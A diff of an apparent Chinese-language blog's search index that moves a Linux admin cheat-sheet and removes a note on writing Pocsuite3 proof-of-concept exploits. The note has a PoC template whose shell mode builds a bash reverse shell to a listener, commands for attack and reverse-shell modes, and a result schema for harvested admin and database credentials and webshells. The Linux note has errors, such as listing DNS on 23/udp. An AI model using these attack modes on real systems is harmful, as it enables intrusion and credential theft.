+<td align="left">22/tcp</td>
+</tr>
+</tbody></table>
+<h1 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h1><pre class="highlight"><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install python36</span><br></pre>
+
+
+
+<h1 id="查看linux版本"><a href="#查看linux版本" class="headerlink" title="查看linux版本"></a>查看linux版本</h1><pre class="highlight"><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -2244,315 +2553,6 @@
       </categories>
       <tags>
         <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux随记</title>
-    <url>/article/Linux%E9%9A%8F%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>
-
-<h2 id="配置DNS："><a href="#配置DNS：" class="headerlink" title="配置DNS："></a>配置DNS：</h2><pre class="highlight"><span class="line">vim /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">nameserver 8.8.8.8</span><br></pre>
-
-<h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>arp -a 192.168.x.x 查看ip是否被使用，用来选择静态ip</p>
-<p>常用DNS：</p>
-<p>国内：114.114.114.114、223.5.5.5、119.29.29.29等</p>
-<p>国外：1.1.1.1、8.8.8.8等</p>
-<h1 id="重要目录及文件"><a href="#重要目录及文件" class="headerlink" title="重要目录及文件"></a>重要目录及文件</h1><table>
-<thead>
-<tr>
-<th align="left">目录</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">/etc</td>
-<td align="left">存放所有管理系统所需要的配置文件和子目录</td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">/etc/passwd #存放操作系统用户信息 /etc/shadow #存放操作系统账户密码 /etc/group #存储当前系统中所有用户组信息 /etc/gshadow #存储用户组密码的一类信息 /etc/nginx/nginx.conf # Nginx配置文件 /etc/httpd/conf/httpd.conf # Apache配置文件路径</td>
-</tr>
-<tr>
-<td align="left">/usr</td>
-<td align="left">Linux系统资源目录，类似Windows下的program files目录</td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">/usr/local/nginx/html # Nginx默认网站路径</td>
-</tr>
-<tr>
-<td align="left">/var</td>
-<td align="left">系统运行时需要改变的数据&lt;br /</td>
-</tr>
-<tr>
-<td align="left"></td>
-<td align="left">/var/log #日志存放目录 /var/spool/cron #计划任务目录，定时执行 /var/lib/mysql # mysql数据路径 /var/www/html # Apache默认网站路径</td>
-</tr>
-</tbody></table>
-<h1 id="常用解压压缩"><a href="#常用解压压缩" class="headerlink" title="常用解压压缩"></a>常用解压压缩</h1><pre class="highlight"><span class="line">tar -zxvf file  -C ./dir			  	#解压.tar.gz文件到指定文件夹</span><br><span class="line"></span><br><span class="line">tar -zcvf ./file  file1 file2			#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面</span><br><span class="line"></span><br><span class="line">unzip file								#解压zip文件</span><br><span class="line"></span><br><span class="line">zip file								#压缩zip文件</span><br><span class="line">7za x file.7z -r -o./					#解压</span><br><span class="line">7za a -t7z file.7z /opt/fileName/*		#压缩</span><br></pre>
-
-<p>注：压缩中，-t指定压缩类型，可忽略（默认7z）</p>
-<p>下载使用</p>
-<pre class="highlight"><span class="line">yum install p7zip -y</span><br></pre>
-
-<h1 id="VI使用"><a href="#VI使用" class="headerlink" title="VI使用"></a>VI使用</h1><table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">i、I</td>
-<td align="left">i光标处输入，I所在行第一个非空格符处输入</td>
-</tr>
-<tr>
-<td align="left">a、A</td>
-<td align="left">a光标下一个字符处输入，A行末处输入</td>
-</tr>
-<tr>
-<td align="left">o、O</td>
-<td align="left">o光标下一新行输入，O光标上一新行输入</td>
-</tr>
-<tr>
-<td align="left">ESC</td>
-<td align="left">命令模式</td>
-</tr>
-<tr>
-<td align="left">ctrl+b</td>
-<td align="left">上翻</td>
-</tr>
-<tr>
-<td align="left">ctrl+f</td>
-<td align="left">下翻</td>
-</tr>
-<tr>
-<td align="left">0</td>
-<td align="left">移动到行首</td>
-</tr>
-<tr>
-<td align="left">$</td>
-<td align="left">移动到行尾</td>
-</tr>
-<tr>
-<td align="left">gg</td>
-<td align="left">移动到文档首</td>
-</tr>
-<tr>
-<td align="left">G</td>
-<td align="left">移动到文档尾</td>
-</tr>
-<tr>
-<td align="left">:%s/word1/word2/g</td>
-<td align="left">全局替换word1为word2</td>
-</tr>
-<tr>
-<td align="left">/word</td>
-<td align="left">向光标之下寻找word字符串</td>
-</tr>
-<tr>
-<td align="left">?word</td>
-<td align="left">向光标之上寻找word字符串</td>
-</tr>
-<tr>
-<td align="left">x、X</td>
-<td align="left">剪切</td>
-</tr>
-<tr>
-<td align="left">dd</td>
-<td align="left">删除整行</td>
-</tr>
-<tr>
-<td align="left">ndd</td>
-<td align="left">删除n行</td>
-</tr>
-<tr>
-<td align="left">yy</td>
-<td align="left">复制整行</td>
-</tr>
-<tr>
-<td align="left">nyy</td>
-<td align="left">复制n行</td>
-</tr>
-<tr>
-<td align="left">p、P</td>
-<td align="left">p向下粘贴，P向上粘贴</td>
-</tr>
-<tr>
-<td align="left">u</td>
-<td align="left">撤销，直至还原</td>
-</tr>
-<tr>
-<td align="left">ctrl+r</td>
-<td align="left">撤销，仅限一步</td>
-</tr>
-<tr>
-<td align="left">.</td>
-<td align="left">重复上一个动作</td>
-</tr>
-<tr>
-<td align="left">:q</td>
-<td align="left">不保存退出</td>
-</tr>
-<tr>
-<td align="left">:w</td>
-<td align="left">保存退出</td>
-</tr>
-<tr>
-<td align="left">:!</td>
-<td align="left">强制执行</td>
-</tr>
-<tr>
-<td align="left">:! command</td>
-<td align="left">暂时离开vi执行command</td>
-</tr>
-<tr>
-<td align="left">:set nu</td>
-<td align="left">显示行号</td>
-</tr>
-<tr>
-<td align="left">:set nonu</td>
-<td align="left">取消显示行号</td>
-</tr>
-</tbody></table>
-<h1 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h1><pre class="highlight"><span class="line">find / -name &quot;file&quot;  在根目录下查看文件名为file的文件</span><br><span class="line">find / -perm &quot;root&quot;  在根目录下查找root权限文件</span><br><span class="line">find / -user &quot;root&quot;  在根目录下查找root用户文件</span><br></pre>
-
-<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="curl安装"><a href="#curl安装" class="headerlink" title="curl安装"></a>curl安装</h2><p>（需要有下载路径，本机对服务器的下载）</p>
-<p>curl _ip/_file -o filename -o可替换为&gt;</p>
-<h2 id="scp上传"><a href="#scp上传" class="headerlink" title="scp上传"></a>scp上传</h2><p>（需要有源文件，本机对服务器的上传）</p>
-<p>scp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传</p>
-<p>scp filename root@ip:/_path</p>
-<h2 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h2><p>（需要源网站里面有对应的软件）</p>
-<table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">yum search</td>
-<td align="left">查找</td>
-</tr>
-<tr>
-<td align="left">yum install</td>
-<td align="left">安装</td>
-</tr>
-<tr>
-<td align="left">yum remove</td>
-<td align="left">移除</td>
-</tr>
-<tr>
-<td align="left">yum update</td>
-<td align="left">升级，可指定升级，也可全部升级</td>
-</tr>
-</tbody></table>
-<p>注：yum源文件：/etc/yum.repos.d</p>
-<h2 id="wget安装"><a href="#wget安装" class="headerlink" title="wget安装"></a>wget安装</h2><p>（同curl，但是更简单，速度更快）</p>
-<p>wget _path/_file</p>
-<h2 id="源码安装步骤"><a href="#源码安装步骤" class="headerlink" title="源码安装步骤"></a>源码安装步骤</h2><table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">1、tar 解包</td>
-<td align="left">解压缩源码包到指定目录</td>
-</tr>
-<tr>
-<td align="left">2、./configure</td>
-<td align="left">配置生成makefile文件，可手动配置参数（如安装路径）</td>
-</tr>
-<tr>
-<td align="left">3、make编译</td>
-<td align="left">生成可执行的二进制文件</td>
-</tr>
-<tr>
-<td align="left">4、make install安装</td>
-<td align="left">复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）</td>
-</tr>
-</tbody></table>
-<p>注：configure配置文档（官方文档）</p>
-<p><a href="http://nginx.org/en/docs/configure/html">http://nginx.org/en/docs/configure/html</a></p>
-<h1 id="firewall防火墙配置"><a href="#firewall防火墙配置" class="headerlink" title="firewall防火墙配置"></a>firewall防火墙配置</h1><table>
-<thead>
-<tr>
-<th>命令</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>firewall-cmd –state</td>
-<td align="left">查看防火墙状态</td>
-</tr>
-<tr>
-<td>firewall-cmd –get-active-zones</td>
-<td align="left">查看正在使用的区域及网卡名称</td>
-</tr>
-<tr>
-<td>firewall-cmd –list-all-zones</td>
-<td align="left">显示当前预期网卡配置参数、资源、端口及服务等信息</td>
-</tr>
-<tr>
-<td>firewall-cmd –zone=public –add-port=80/tcp –permanent</td>
-<td align="left">允许80端口tcp流量通过，永久生效</td>
-</tr>
-<tr>
-<td>firewall-cmd –zone=public –add-service=http –permanent</td>
-<td align="left">同上，不同的配置方式</td>
-</tr>
-<tr>
-<td>firewall-cmd –zone=public –remove-port=23/udp –permanent</td>
-<td align="left">禁止23端口udp流量通过，永久生效</td>
-</tr>
-<tr>
-<td>firewall-zone –zone=public –remove-service=dns –permanent</td>
-<td align="left">同上，不同配置方式</td>
-</tr>
-</tbody></table>
-<p>常用端口服务：</p>
-<table>
-<thead>
-<tr>
-<th align="left">服务</th>
-<th align="left">端口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">http</td>
-<td align="left">80/tcp</td>
-</tr>
-<tr>
-<td align="left">https</td>
-<td align="left">443/tcp</td>
-</tr>
-<tr>
-<td align="left">dns</td>
-<td align="left">23/udp</td>
-</tr>
-<tr>
-<td align="left">mysql</td>
-<td align="left">3306/tcp</td>
-</tr>
-<tr>
-<td align="left">ssh</td>
-<td align="left">22/tcp</td>
-</tr>
-</tbody></table>
-<h1 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h1><pre class="highlight"><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install python36</span><br></pre>
-
-
-
-<h1 id="查看linux版本"><a href="#查看linux版本" class="headerlink" title="查看linux版本"></a>查看linux版本</h1><pre class="highlight"><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br></pre>
-
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -3684,352 +3684,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Pocsuite3使用</title>
-    <url>/article/Pocsuite3%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>
-
-<p>（所有字母均为小写,所有的符号改成_）</p>
-<p>例：</p>
-<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>
-
-<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>
-
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>
-
-<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>
-
-<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">from pocsuite3.api import logger</td>
-<td align="left">日志记录，比如logger.log(info)</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import requests</td>
-<td align="left">请求类，用法同 requests</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import Seebug</td>
-<td align="left">Seebug api 调用</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import ZoomEye</td>
-<td align="left">ZoomEye api 调用</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import CEye</td>
-<td align="left">Ceye api 调用</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import crawl</td>
-<td align="left">简单爬虫功能</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import PHTTPServer</td>
-<td align="left">Http服务功能</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import REVERSE_PAYLOAD</td>
-<td align="left">反向连接shell payload</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import get_results</td>
-<td align="left">获取结果</td>
-</tr>
-</tbody></table>
-<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
-<thead>
-<tr>
-<th align="left">英文名称</th>
-<th align="left">中文名称</th>
-<th align="left">缩写</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Cross Site Scripting</td>
-<td align="left">跨站脚本</td>
-<td align="left">xss</td>
-</tr>
-<tr>
-<td align="left">Cross Site Request Forgery</td>
-<td align="left">跨站请求伪造</td>
-<td align="left">csrf</td>
-</tr>
-<tr>
-<td align="left">SQL Injection</td>
-<td align="left">Sql注入</td>
-<td align="left">sql-inj</td>
-</tr>
-<tr>
-<td align="left">LDAP Injection</td>
-<td align="left">ldap注入</td>
-<td align="left">ldap-inj</td>
-</tr>
-<tr>
-<td align="left">Mail Command Injection</td>
-<td align="left">邮件命令注入</td>
-<td align="left">smtp-inj</td>
-</tr>
-<tr>
-<td align="left">Null Byte Injection</td>
-<td align="left">空字节注入</td>
-<td align="left">null-byte-inj</td>
-</tr>
-<tr>
-<td align="left">CRLF Injection</td>
-<td align="left">CRLF注入</td>
-<td align="left">crlf-inj</td>
-</tr>
-<tr>
-<td align="left">SSI Injection</td>
-<td align="left">Ssi注入</td>
-<td align="left">ssi-inj</td>
-</tr>
-<tr>
-<td align="left">XPath Injection</td>
-<td align="left">Xpath注入</td>
-<td align="left">xpath-inj</td>
-</tr>
-<tr>
-<td align="left">XML Injection</td>
-<td align="left">Xml注入</td>
-<td align="left">xml-inj</td>
-</tr>
-<tr>
-<td align="left">XQuery Injection</td>
-<td align="left">Xquery 注入</td>
-<td align="left">xquery-inj</td>
-</tr>
-<tr>
-<td align="left">Command Execution</td>
-<td align="left">命令执行</td>
-<td align="left">cmd-exec</td>
-</tr>
-<tr>
-<td align="left">Code Execution</td>
-<td align="left">代码执行</td>
-<td align="left">code-exec</td>
-</tr>
-<tr>
-<td align="left">Remote File Inclusion</td>
-<td align="left">远程文件包含</td>
-<td align="left">rfi</td>
-</tr>
-<tr>
-<td align="left">Local File Inclusion</td>
-<td align="left">本地文件包含</td>
-<td align="left">lfi</td>
-</tr>
-<tr>
-<td align="left">Abuse of Functionality</td>
-<td align="left">功能函数滥用</td>
-<td align="left">func-abuse</td>
-</tr>
-<tr>
-<td align="left">Brute Force</td>
-<td align="left">暴力破解</td>
-<td align="left">brute-force</td>
-</tr>
-<tr>
-<td align="left">Buffer Overflow</td>
-<td align="left">缓冲区溢出</td>
-<td align="left">buffer-overflow</td>
-</tr>
-<tr>
-<td align="left">Content Spoofing</td>
-<td align="left">内容欺骗</td>
-<td align="left">spoofing</td>
-</tr>
-<tr>
-<td align="left">Credential Prediction</td>
-<td align="left">证书预测</td>
-<td align="left">credential-prediction</td>
-</tr>
-<tr>
-<td align="left">Session Prediction</td>
-<td align="left">会话预测</td>
-<td align="left">session-prediction</td>
-</tr>
-<tr>
-<td align="left">Denial of Service</td>
-<td align="left">拒绝服务</td>
-<td align="left">dos</td>
-</tr>
-<tr>
-<td align="left">Fingerprinting</td>
-<td align="left">指纹识别</td>
-<td align="left">finger</td>
-</tr>
-<tr>
-<td align="left">Format String</td>
-<td align="left">格式化字符串</td>
-<td align="left">format-string</td>
-</tr>
-<tr>
-<td align="left">HTTP Response Smuggling</td>
-<td align="left">http响应伪造</td>
-<td align="left">http-response-smuggling</td>
-</tr>
-<tr>
-<td align="left">HTTP Response Splitting</td>
-<td align="left">http响应拆分</td>
-<td align="left">http-response-splitting</td>
-</tr>
-<tr>
-<td align="left">HTTP Request Splitting</td>
-<td align="left">http请求拆分</td>
-<td align="left">http-request-splitting</td>
-</tr>
-<tr>
-<td align="left">HTTP Request Smuggling</td>
-<td align="left">http请求伪造</td>
-<td align="left">http-request-smuggling</td>
-</tr>
-<tr>
-<td align="left">HTTP Parameter Pollution</td>
-<td align="left">http参数污染</td>
-<td align="left">hpp</td>
-</tr>
-<tr>
-<td align="left">Integer Overflows</td>
-<td align="left">整数溢出</td>
-<td align="left">int-overflow</td>
-</tr>
-<tr>
-<td align="left">Predictable Resource Location</td>
-<td align="left">可预测资源定位</td>
-<td align="left">res-location</td>
-</tr>
-<tr>
-<td align="left">Session Fixation</td>
-<td align="left">会话固定</td>
-<td align="left">session-fixation</td>
-</tr>
-<tr>
-<td align="left">URL Redirector Abuse</td>
-<td align="left">url重定向</td>
-<td align="left">redirect</td>
-</tr>
-<tr>
-<td align="left">Privilege Escalation</td>
-<td align="left">权限提升</td>
-<td align="left">privilege-escalation</td>
-</tr>
-<tr>
-<td align="left">Resolve Error</td>
-<td align="left">解析错误</td>
-<td align="left">resolve-error</td>
-</tr>
-<tr>
-<td align="left">Arbitrary File Creation</td>
-<td align="left">任意文件创建</td>
-<td align="left">file-creation</td>
-</tr>
-<tr>
-<td align="left">Arbitrary File Download</td>
-<td align="left">任意文件下载</td>
-<td align="left">file-download</td>
-</tr>
-<tr>
-<td align="left">Arbitrary File Deletion</td>
-<td align="left">任意文件删除</td>
-<td align="left">file-deletion</td>
-</tr>
-<tr>
-<td align="left">Backup File Found</td>
-<td align="left">备份文件发现</td>
-<td align="left">bak-file-found</td>
-</tr>
-<tr>
-<td align="left">Database Found</td>
-<td align="left">数据库发现</td>
-<td align="left">db-found</td>
-</tr>
-<tr>
-<td align="left">Directory Listing</td>
-<td align="left">目录遍历</td>
-<td align="left">dir-listing</td>
-</tr>
-<tr>
-<td align="left">Directory Traversal</td>
-<td align="left">目录穿越</td>
-<td align="left">dir-traversal</td>
-</tr>
-<tr>
-<td align="left">File Upload</td>
-<td align="left">文件上传</td>
-<td align="left">file-upload</td>
-</tr>
-<tr>
-<td align="left">Login Bypass</td>
-<td align="left">登录绕过</td>
-<td align="left">login-bypass</td>
-</tr>
-<tr>
-<td align="left">Weak Password</td>
-<td align="left">弱密码</td>
-<td align="left">weak-pass</td>
-</tr>
-<tr>
-<td align="left">Remote Password Change</td>
-<td align="left">远程密码修改</td>
-<td align="left">remote-pass-change</td>
-</tr>
-<tr>
-<td align="left">Code Disclosure</td>
-<td align="left">代码泄漏</td>
-<td align="left">code-disclosure</td>
-</tr>
-<tr>
-<td align="left">Path Disclosure</td>
-<td align="left">路径泄漏</td>
-<td align="left">path-disclosure</td>
-</tr>
-<tr>
-<td align="left">Information Disclosure</td>
-<td align="left">信息泄漏</td>
-<td align="left">info-disclosure</td>
-</tr>
-<tr>
-<td align="left">Security Mode Bypass</td>
-<td align="left">安全模式绕过</td>
-<td align="left">sec-bypass</td>
-</tr>
-<tr>
-<td align="left">Malware</td>
-<td align="left">挂马</td>
-<td align="left">mal</td>
-</tr>
-<tr>
-<td align="left">Black Link</td>
-<td align="left">暗链</td>
-<td align="left">black-link</td>
-</tr>
-<tr>
-<td align="left">Backdoor</td>
-<td align="left">后门</td>
-<td align="left">backdoor</td>
-</tr>
-<tr>
-<td align="left">Unauthorized access</td>
-<td align="left">未授权访问</td>
